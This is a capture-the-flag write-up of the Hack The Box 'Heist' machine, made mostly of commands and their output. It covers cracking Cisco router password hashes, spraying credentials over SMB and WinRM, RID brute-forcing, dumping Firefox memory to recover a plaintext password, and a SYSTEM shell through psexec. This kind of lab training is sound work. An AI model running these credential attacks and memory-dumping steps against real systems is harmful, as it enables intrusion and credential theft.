
### Initial access
Port scan
```

```
subdomain scan
dirscan
filescan

Looting web site
```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh


```

Crack password and for cisco https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html
```
┌──(kali㉿kali)-[~/HTB/Heist]
└─$ echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' > admin_hash.txt        

                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Heist]
└─$ john  --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)     
1g 0:00:00:03 DONE (2026-09-21 05:59) 0.2865g/s 1004Kp/s 1004Kc/s 1004KC/s stealthy001..stayfrost!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
After crack router pass but only user hazard work
```
┌──(kali㉿kali)-[~/HTB/Heist]
└─$ nxc smb  10.129.96.157 -u admin rout3r hazard -p '$uperP@ssword' 'Q4)sJu\Y8qz*A3?d' 'stealth1agent'

SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)                                                                                                                                                    
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
                                                                                               
```

Using rpc to find more user
```
┌──(kali㉿kali)-[~/HTB/Heist]
└─$ nxc smb 10.129.96.157 -u hazard -p 'stealth1agent' --rid-brute

SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False) 
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
SMB         10.129.96.157   445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.129.96.157   445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)

nxc smb 10.129.96.157 -u hazard -p 'stealth1agent' --rid-brute | grep -E "SidTypeUser" | awk -F'\\' '{print $2}' | awk -F' ' '{print $1}' | sort -u > user.txt
```

Brute user
```bash
┌──(kali㉿kali)-[~/HTB/Heist]
└─$ nxc winrm  10.129.96.157 -u  user.txt -p  pass.txt  
WINRM       10.129.96.157   5985   SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.96.157   5985   SUPPORTDESK      [-] SupportDesk\Administrator:Q4)sJu\Y8qz*A3?d
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.96.157   5985   SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)


```

Cred `Chase:Q4)sJu\Y8qz*A3?d`
```
┌──(kali㉿kali)-[~/HTB/Heist]
└─$ evil-winrm -i  10.129.96.157  -u Chase  -p 'Q4)sJu\Y8qz*A3?d' 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents> whoami
supportdesk\chase

```
### Priv escalation
Dump browser mem
```powershell
*Evil-WinRM* PS C:\tmp> Get-Process firefox

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    355      25    16388      39008       0.11   6180   1 firefox
   1072      68   129128     205800       5.03   6356   1 firefox
    347      19    10252      38848       0.13   6464   1 firefox
    401      33    30900      88892       0.77   6616   1 firefox
    378      28    21564      58368       1.08   6892   1 firefox


*Evil-WinRM* PS C:\tmp> .\procdump64.exe -ma 6356 -accepteula C:\tmp\firefox_dump.dmp


```
Read dump
```bash
┌──(kali㉿kali)-[~/HTB/Heist]
└─$ strings firefox_dump.dmp| grep pass 
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
WARNING: content window passed to PrivateBrowsingUtils.isWindowPrivate. Use isContentWindowPrivate instead (but only for frame scripts).
No principal passed to deserializePrincipal and no fallbackPrincipalCallback
localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=

```

```bash {2}
MB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\WDAGUtilityAccount:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Administrator:4dD!5}x/re8]FBuZ (Pwn3d!)
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\DefaultAccount:4dD!5}x/re8]FBuZ STATUS_LOGON_FAILURE 

```

```
┌──(kali㉿kali)-[~/HTB/Heist]
└─$ impacket-psexec 'administrator':'4dD!5}x/re8]FBuZ'@10.129.96.157  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.96.157.....
[*] Found writable share ADMIN$
[*] Uploading file FTQCOVWM.exe
[*] Opening SVCManager on 10.129.96.157.....
[*] Creating service GfMg on 10.129.96.157.....
[*] Starting service GfMg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.437]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```